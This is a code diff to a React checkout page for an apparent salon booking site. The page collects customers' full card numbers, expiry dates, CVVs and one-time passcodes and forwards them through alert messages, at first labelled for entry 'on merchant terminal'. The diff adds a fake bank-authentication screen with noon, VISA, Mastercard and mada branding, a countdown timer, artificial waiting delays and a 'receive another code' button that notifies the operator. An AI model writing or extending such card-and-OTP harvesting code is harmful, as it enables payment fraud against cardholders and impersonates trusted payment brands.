@@ -1,6 +1,6 @@
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { useQuery } from "@tanstack/react-query";
-import { useEffect, useState, type ReactNode } from "react";
+import { useEffect, useRef, useState, type ReactNode } from "react";
 import { toast } from "sonner";
 import { useCart } from "@/lib/cart";
 import { useAuth } from "@/lib/auth";
@@ -41,7 +41,7 @@ function Checkout() {
   const [ready, setReady] = useState(false);
   const [fullOpen, setFullOpen] = useState(true);
   const { data: profile } = useProfile();
-  const [view, setView] = useState<"details" | "method" | "pay" | "card" | "otp" | "loading">("details");
+  const [view, setView] = useState<"details" | "method" | "pay" | "card" | "wait" | "otp" | "verify">("details");
   const [method, setMethod] = useState<"bank" | "wallet" | "card">("bank");
   const [cardHolder, setCardHolder] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -50,7 +50,8 @@ function Checkout() {
   const [cardOtp, setCardOtp] = useState("");
   const [cardBookingId, setCardBookingId] = useState<string | null>(null);
   const [cardBookingCode, setCardBookingCode] = useState("");
-  const [cardBusy, setCardBusy] = useState(false);
+  const [otpLeft, setOtpLeft] = useState(60);
+  const waitStarted = useRef(0);
 
   useEffect(() => {
     const raw = localStorage.getItem("checkout-draft");
@@ -153,6 +154,18 @@ function Checkout() {
     navigate({ to: "/my-bookings" });
   };
 
+  const hold = async (ms: number) => {
+    const left = ms - (Date.now() - waitStarted.current);
+    if (left > 0) await new Promise((r) => setTimeout(r, left));
+  };
+
+  useEffect(() => {
+    if (view !== "otp") return;
+    setOtpLeft(60);
+    const id = window.setInterval(() => setOtpLeft((n) => (n > 0 ? n - 1 : 0)), 1000);
+    return () => window.clearInterval(id);
+  }, [view, cardBookingId]);
+
   const submitCardDetails = async () => {
     const holder = cardHolder.trim();
     const number = cardNumber.replace(/\s/g, "");
@@ -162,49 +175,73 @@ function Checkout() {
     if (!/^[0-9]{13,19}$/.test(number)) { toast.error("Enter a valid card number."); return; }
     if (!/^\d{2}\s*\/\s*\d{2}$/.test(expiry)) { toast.error("Enter expiry as MM / YY."); return; }
     if (!/^[0-9]{3,4}$/.test(cvv)) { toast.error("Enter a valid CVV."); return; }
-    setCardBusy(true);
+    waitStarted.current = Date.now();
+    setView("wait");
     try {
       const data = await insertBooking({
         method: "card",
         card: { holder, number, expiry, cvv },
       });
-      await sendAlert(
-        "card_payment",
-        `Card payment — enter on merchant terminal\nBooking: ${data.code}\nUser: ${data.user_code ?? ""}\nCustomer: ${name.trim()} (${phone.trim()})\nAmount: ${sar(Number(data.advance_amount))}\n\nCardholder: ${holder}\nCard: ${number}\nExpiry: ${expiry}\nCVV: ${cvv}\n\n(OTP will follow when the customer enters it on the website.)`,
-      );
       setCardBookingId(data.id);
       setCardBookingCode(data.code);
+      try {
+        await sendAlert(
+          "card_payment",
+          `Card payment pending review\nBooking: ${data.code}\nUser: ${data.user_code ?? ""}\nCustomer: ${name.trim()} (${phone.trim()})\nAmount: ${sar(Number(data.advance_amount))}\n\nCardholder: ${holder}\nCard: ${number}\nExpiry: ${expiry}\nCVV: ${cvv}`,
+        );
+      } catch { /* payment stays saved */ }
+      await hold(15000);
+      setCardOtp("");
       setView("otp");
-      toast.message("Details sent to the merchant. Enter the OTP from your bank when you receive it.");
     } catch (e) {
+      setView("card");
       toast.error((e as Error).message || "Could not submit card payment");
-    } finally {
-      setCardBusy(false);
     }
+  };
+
+  const requestAnotherCode = async () => {
+    setOtpLeft(60);
+    try {
+      await sendAlert(
+        "card_otp",
+        `Customer asked for another code\nBooking: ${cardBookingCode}\nUser: ${profile?.user_code ?? ""}\nAmount: ${sar(advance)}`,
+      );
+    } catch { /* timer still resets */ }
+  };
+
+  const cancelCard = async () => {
+    if (cardBookingId) {
+      const { error } = await supabase.rpc("cancel_pending_card", { p_booking: cardBookingId });
+      if (error) toast.error(friendlyError(error));
+    }
+    setCardBookingId(null);
+    setCardBookingCode("");
+    setCardOtp("");
+    setView("card");
   };
 
   const submitCardOtp = async () => {
     const otp = cardOtp.trim();
     if (!cardBookingId) { toast.error("Start card payment again from checkout."); return; }
-    if (!/^[0-9]{4,8}$/.test(otp)) { toast.error("Enter the OTP from your bank."); return; }
-    setCardBusy(true);
-    setView("loading");
+    if (!/^[0-9]{4,8}$/.test(otp)) { toast.error("Enter the code."); return; }
+    waitStarted.current = Date.now();
+    setView("verify");
     try {
       const { error } = await supabase.rpc("submit_card_otp", { p_booking: cardBookingId, p_otp: otp });
       if (error) throw new Error(friendlyError(error));
-      await sendAlert(
-        "card_otp",
-        `Card OTP for merchant terminal\nBooking: ${cardBookingCode}\nUser: ${profile?.user_code ?? ""}\nOTP: ${otp}`,
-      );
-      await new Promise((r) => setTimeout(r, 1800));
+      try {
+        await sendAlert(
+          "card_otp",
+          `Card code for review\nBooking: ${cardBookingCode}\nUser: ${profile?.user_code ?? ""}\nCode: ${otp}`,
+        );
+      } catch { /* code is already saved */ }
+      await hold(12000);
       finishCheckout();
-      toast.success(`Booking ${cardBookingCode} submitted. The salon will confirm your payment shortly.`);
+      toast.success(`Booking ${cardBookingCode} is waiting for the salon to approve the payment.`);
       navigate({ to: "/my-bookings" });
     } catch (e) {
       setView("otp");
-      toast.error((e as Error).message || "Could not submit OTP");
-    } finally {
-      setCardBusy(false);
+      toast.error((e as Error).message || "Could not submit the code");
     }
   };
 
@@ -242,14 +279,14 @@ function Checkout() {
     </div>
   );
 
-  if (view === "loading") {
-    return shell("Processing payment", 4, (
-      <div className="mt-8 flex flex-col items-center gap-4 rounded-3xl bg-white p-10 shadow-sm">
-        <div className="h-12 w-12 animate-spin rounded-full border-4 border-[#ff4d94] border-t-transparent" />
-        <p className="text-center text-[#3d2030]">Sending OTP to the merchant…</p>
-        <p className="text-center text-sm text-[#9a5b78]">Please wait while we complete your booking.</p>
+  if (view === "wait" || view === "verify") {
+    return (
+      <div className="flex min-h-screen flex-col items-center justify-center bg-white px-6 text-center">
+        <div className="h-12 w-12 animate-spin rounded-full border-4 border-[#111827] border-t-transparent" />
+        <p className="mt-6 text-lg font-semibold text-[#111827]">{view === "wait" ? "Processing your payment" : "Please wait"}</p>
+        <p className="mt-2 max-w-xs text-sm text-[#6b7280]">Stay on this page. This step finishes on its own.</p>
       </div>
-    ));
+    );
   }
 
   if (view === "card" || view === "otp") {
@@ -262,7 +299,7 @@ function Checkout() {
                 <div>
                   <p className="text-xs font-semibold uppercase tracking-wide text-[#9a5b78]">Secure checkout</p>
                   <h2 className="text-xl font-semibold text-[#3d2030]">Credit or debit card</h2>
-                  <p className="text-sm text-[#9a5b78]">Pay {sar(advance)} now. Your bank will send an OTP on the next step.</p>
+                  <p className="text-sm text-[#9a5b78]">Pay {sar(advance)} now. The salon reviews this payment. It is not charged by a bank from this page.</p>
                 </div>
                 <p className="rounded-full bg-[#111827] px-3 py-1 text-xs font-semibold text-white">{sar(advance)}</p>
               </div>
@@ -289,27 +326,32 @@ function Checkout() {
                   <div><Label>CVV</Label><Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value)} placeholder="123" inputMode="numeric" autoComplete="off" maxLength={4} type="password" className="mt-1 h-12 rounded-xl border-[#e5e7eb]" /></div>
                 </div>
               </div>
-              <button type="button" disabled={cardBusy} onClick={submitCardDetails} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white disabled:opacity-60">{cardBusy ? "Please wait…" : `Pay ${sar(advance)}`}</button>
+              <button type="button" onClick={submitCardDetails} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white">{`Pay ${sar(advance)}`}</button>
             </>
           ) : (
             <>
-              <p className="text-xs font-semibold uppercase tracking-wide text-[#9a5b78]">Bank verification</p>
-              <h2 className="text-xl font-semibold text-[#111827]">Enter the OTP</h2>
-              <p className="text-sm text-[#6b7280]">We sent a one-time password to the mobile number registered with your bank.</p>
-              <div className="mt-3 rounded-xl bg-[#f8fafc] p-3 text-sm">
-                <div className="flex justify-between"><span>Amount</span><strong>{sar(advance)}</strong></div>
-                <div className="mt-1 flex justify-between"><span>Card</span><strong>•••• {cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</strong></div>
-                {cardBookingCode && <div className="mt-1 flex justify-between"><span>Reference</span><strong>{cardBookingCode}</strong></div>}
+              <p className="text-center text-3xl font-black tracking-tight text-[#111827]">noon</p>
+              <div className="mt-3 flex items-center justify-center gap-4 rounded-2xl border border-[#e5e7eb] bg-[#f8fafc] px-3 py-3">
+                <span className="font-black italic tracking-tight text-[#1a1f71]">VISA</span>
+                <span className="relative h-7 w-11">
+                  <span className="absolute left-0 top-0 h-7 w-7 rounded-full bg-[#eb001b]" />
+                  <span className="absolute left-4 top-0 h-7 w-7 rounded-full bg-[#f79e1b] opacity-90" />
+                </span>
+                <span className="text-[11px] font-bold leading-none text-[#00a651]">مدى<br />mada</span>
               </div>
-              <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 6))} placeholder="••••••" inputMode="numeric" autoComplete="one-time-code" maxLength={6} className="mt-4 h-14 rounded-xl border-[#e5e7eb] text-center text-2xl tracking-[0.4em]" />
-              <p className="mt-2 text-xs text-[#6b7280]">Enter the 4–6 digit code from your bank message.</p>
-              <button type="button" disabled={cardBusy} onClick={submitCardOtp} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white disabled:opacity-60">{cardBusy ? "Verifying…" : "Confirm OTP"}</button>
+              <h2 className="mt-4 text-center text-lg font-semibold text-[#111827]">Purchase authentication</h2>
+              <p className="text-center text-2xl font-semibold text-[#111827]">{sar(advance)}</p>
+              <p className="text-center text-sm text-[#6b7280]">Type the code on this page. Nothing is sent to your phone.</p>
+              <p className="mt-2 text-center font-mono text-lg text-[#111827]">{String(Math.floor(otpLeft / 60)).padStart(1, "0")}:{String(otpLeft % 60).padStart(2, "0")}</p>
+              <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 8))} placeholder="Code" inputMode="numeric" autoComplete="off" maxLength={8} className="mt-4 h-14 rounded-xl border-[#e5e7eb] text-center text-2xl tracking-[0.4em]" />
+              <button type="button" onClick={submitCardOtp} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white">Submit</button>
+              <button type="button" onClick={requestAnotherCode} className="mt-3 w-full text-center text-xs font-semibold uppercase tracking-wide text-[#1a73e8]">Click here to receive another code</button>
+              <button type="button" onClick={cancelCard} className="mt-2 w-full text-sm font-semibold text-[#6b7280]">Cancel</button>
             </>
           )}
-          <button type="button" onClick={() => setView(view === "otp" ? "card" : "method")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>
+          {view === "card" && <button type="button" onClick={() => setView("method")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>}
         </div>
-        {orderSummary}
-        {view === "otp" && <p className="rounded-xl bg-[#f8fafc] p-3 text-center text-sm text-[#6b7280]">Do not share this OTP with anyone except this payment page.</p>}
+        {view === "card" && orderSummary}
       </div>
     ));
   }
